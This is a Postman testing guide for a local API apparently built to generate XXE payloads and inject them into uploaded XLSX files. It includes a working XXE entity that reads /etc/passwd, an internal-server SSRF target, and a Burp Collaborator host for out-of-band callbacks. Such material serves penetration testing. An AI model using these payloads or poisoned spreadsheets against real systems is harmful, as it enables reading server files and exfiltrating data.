# Postman Testing Guide for XXE XLSX Tool

## Prerequisites
1. Start backend server: `python app.py`
2. Ensure server is running on `http://localhost:5000`

## API Endpoints to Test

### 1. Health Check
**Method:** GET  
**URL:** `http://localhost:5000/api/health`  
**Headers:** None required  
**Body:** None  

**Expected Response:**
```json
{
  "status": "healthy",
  "message": "XXE XLSX Tool Backend is running",
  "version": "1.0.0"
}
```

---

### 2. Generate Payloads
**Method:** POST  
**URL:** `http://localhost:5000/api/generate-payloads`  
**Headers:**
- `Content-Type: application/json`

**Body (JSON):**
```json
{
  "target_url": "http://internal.server/resource",
  "collaborator": "https://test.burpcollaborator.net",
  "attack_type": "all"
}
```

**Alternative Test Bodies:**

*Test 1 - Only Collaborator:*
```json
{
  "collaborator": "https://test.burpcollaborator.net",
  "attack_type": "doctype"
}
```

*Test 2 - Only Target URL:*
```json
{
  "target_url": "file:///etc/passwd",
  "attack_type": "xinclude"
}
```

*Test 3 - Specific Attack Type:*
```json
{
  "collaborator": "https://test.burpcollaborator.net",
  "attack_type": "dtd"
}
```

**Expected Response:**
```json
{
  "success": true,
  "payloads": [
    {
      "name": "File Read: Linux /etc/passwd",
      "type": "doctype",
      "payload": "<?xml version=\"1.0\"?>\n<!DOCTYPE data [\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<data>&xxe;</data>",
      "description": "Read Linux /etc/passwd"
    }
  ],
  "count": 12
}
```

---

### 3. Inject XXE into XLSX
**Method:** POST  
**URL:** `http://localhost:5000/api/inject-xxe`  
**Headers:** None (Postman auto-sets multipart/form-data)

**Body (form-data):**
- `file`: [Select an XLSX file]
- `payload_type`: `doctype`
- `payload`: `<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>`
- `collaborator`: `https://test.burpcollaborator.net`

**Expected Response:**
```json
{
  "success": true,
  "output_filename": "xxe_20241201_143022_sample.xlsx",
  "modified_files": ["xl/workbook.xml", "xl/sharedStrings.xml"],
  "message": "Successfully injected XXE payload into 2 files"
}
```

---

### 4. Download Processed File
**Method:** GET  
**URL:** `http://localhost:5000/api/download/xxe_20241201_143022_sample.xlsx`  
**Headers:** None  
**Body:** None  

**Expected Response:** File download

---

## Step-by-Step Postman Setup

### Test 1: Health Check
1. Create new request
2. Set method to `GET`
3. Enter URL: `http://localhost:5000/api/health`
4. Click `Send`
5. Should return 200 OK with health status

### Test 2: Generate Payloads
1. Create new request
2. Set method to `POST`
3. Enter URL: `http://localhost:5000/api/generate-payloads`
4. Go to `Headers` tab:
   - Key: `Content-Type`
   - Value: `application/json`
5. Go to `Body` tab:
   - Select `raw`
   - Select `JSON` from dropdown
   - Paste the JSON payload
6. Click `Send`

### Test 3: File Upload (XXE Injection)
1. Create new request
2. Set method to `POST`
3. Enter URL: `http://localhost:5000/api/inject-xxe`
4. Go to `Body` tab:
   - Select `form-data`
   - Add key `file`, change type to `File`, select an XLSX file
   - Add key `payload_type`, value: `doctype`
   - Add key `payload`, value: `<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>`
   - Add key `collaborator`, value: `https://test.burpcollaborator.net`
5. Click `Send`

## Error Testing

### Test Invalid Attack Type
**Body:**
```json
{
  "attack_type": "invalid_type"
}
```
**Expected:** 400 Bad Request

### Test Missing File Upload
**URL:** `http://localhost:5000/api/inject-xxe`  
**Body:** form-data without file  
**Expected:** 400 Bad Request with "No file uploaded"

## Sample XLSX File for Testing
Create a simple Excel file with:
- Sheet1 with some data (A1: "Test", B1: "Data")
- Save as .xlsx format
- Use this file for upload testing

## Postman Collection JSON
```json
{
  "info": {
    "name": "XXE XLSX Tool API",
    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
  },
  "item": [
    {
      "name": "Health Check",
      "request": {
        "method": "GET",
        "header": [],
        "url": {
          "raw": "http://localhost:5000/api/health",
          "protocol": "http",
          "host": ["localhost"],
          "port": "5000",
          "path": ["api", "health"]
        }
      }
    },
    {
      "name": "Generate Payloads",
      "request": {
        "method": "POST",
        "header": [
          {
            "key": "Content-Type",
            "value": "application/json"
          }
        ],
        "body": {
          "mode": "raw",
          "raw": "{\n  \"target_url\": \"http://internal.server/resource\",\n  \"collaborator\": \"https://test.burpcollaborator.net\",\n  \"attack_type\": \"all\"\n}"
        },
        "url": {
          "raw": "http://localhost:5000/api/generate-payloads",
          "protocol": "http",
          "host": ["localhost"],
          "port": "5000",
          "path": ["api", "generate-payloads"]
        }
      }
    }
  ]
}
```

## Success Indicators
✅ Health check returns 200 OK  
✅ Payload generation returns JSON with payloads array  
✅ File upload returns success with output filename  
✅ Download returns file content  
✅ Error cases return appropriate HTTP status codes